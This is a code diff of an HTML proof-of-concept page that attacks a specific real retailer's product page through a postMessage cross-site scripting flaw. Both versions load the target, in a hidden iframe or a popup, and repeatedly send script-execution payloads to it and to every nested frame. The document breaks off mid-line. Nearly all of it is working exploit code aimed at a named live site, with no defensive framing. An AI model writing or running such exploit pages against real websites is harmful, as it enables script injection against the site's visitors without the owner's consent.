@@ -1,31 +1,45 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>postMessage XSS PoC (no popups)</title>
-
-<iframe id="victim" src="https://www.weber.com/US/en/smoquepelletgrill.html"
-        style="width:1px;height:1px;border:0;position:fixed;left:-9999px;top:-9999px;"></iframe>
+<!DOCTYPE html>
+<meta charset="utf-8" />
+<title>postMessage XSS PoC — weber.com</title>
+<body>
+<button onclick="start()">Open target & send payload</button>
 
 <script>
-const FRAME = document.getElementById('victim');
-const DURATION_MS = 15000;   // keep hammering for 15s
-const INTERVAL_MS = 400;
+const TARGET = "https://www.weber.com/US/en/smoquepelletgrill.html";
+const RUNTIME_MS = 20000;   // how long to keep sending
+const TICK_MS    = 400;     // how often to send
 
-// common payload shapes (some handlers expect JSON string, others an object)
+// Try both shapes; add fields if the handler checks them (e.g., type:'exec')
 const payloads = [
   { isTrusted: true, code: "alert('pwned: '+document.domain)" },
   JSON.stringify({ isTrusted: true, code: "alert('pwned JSON: '+document.domain)" })
-  // Add variants if the code checks fields like {type:'exec'} etc.
 ];
 
-function send() {
-  const t0 = Date.now();
-  const timer = setInterval(() => {
-    if (Date.now() - t0 > DURATION_MS) { clearInterval(timer); return; }
-    try { for (const p of payloads) FRAME.contentWindow.postMessage(p, "*"); } catch(e){}
-  }, INTERVAL_MS);
+function sendTo(win) {
+  for (const p of payloads) {
+    try { win.postMessage(p, "*"); } catch (_) {}
+  }
 }
 
-// start after the iframe finishes loading
-FRAME.addEventListener('load', send);
-</script>
+// BFS over windows/frames without reading cross-origin properties
+function blast(win) {
+  const q = [win];
+  const seen = new Set();
+  while (q.length) {
+    const w = q.shift();
+    if (seen.has(w)) continue;
+    seen.add(w);
+    sendTo(w);
+    // enumerate child frames by count; WindowProxy is accessible cross-origin
+    let n = 0;
+    try { n = w.frames.length; } catch (_) { n = 0; }
+    for (let i = 0; i < n; i++) {
+      try { q.push(w.frames[i]); } catch (_) {}
+    }
+  }
+}
+
+async function start() {
+  const w = window.open(TARGET, "weber_poc"); // user gesture avoids popup block
+  if (!w) { alert("Popup blocked—allow popups for this PoC."); r
 
